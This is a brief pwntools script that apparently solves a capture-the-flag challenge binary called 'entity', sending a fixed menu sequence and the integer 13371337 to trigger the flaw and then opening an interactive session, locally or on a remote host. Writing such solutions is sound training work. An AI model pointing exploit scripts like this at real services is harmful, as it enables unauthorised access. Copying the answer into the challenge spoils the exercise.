from pwn import *
import os

os.system('clear')

def start(argv=[], *a, **kw):
    if args.REMOTE:
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

exe = './entity'
elf = context.binary = ELF(exe, checksec=True)
context.log_level = 'debug'

sh = start()

p = flat([
    13371337
])

sh.sendlineafter(b'>> ',b'T')
sh.sendlineafter(b'>> ', b'S')
sh.sendlineafter(b'>> ', p)
sh.sendlineafter(b'>> ', b'C')

sh.interactive()
